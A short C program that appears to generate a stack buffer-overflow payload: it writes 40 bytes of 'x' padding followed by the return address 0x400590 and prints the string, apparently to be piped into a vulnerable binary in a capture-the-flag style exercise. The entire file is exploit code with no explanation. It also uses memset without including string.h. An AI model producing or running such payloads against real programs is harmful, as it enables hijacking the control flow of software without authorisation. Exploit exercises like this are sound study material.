#include <stdio.h>
#include <stdint.h>

int main() {
    int i=0; char buf[45];
    memset(buf, 'x', 44);
    *(uint32_t *) &buf[40] = 0x400590;
    buf[44] = '\0';
    puts(buf);
    return 0;
}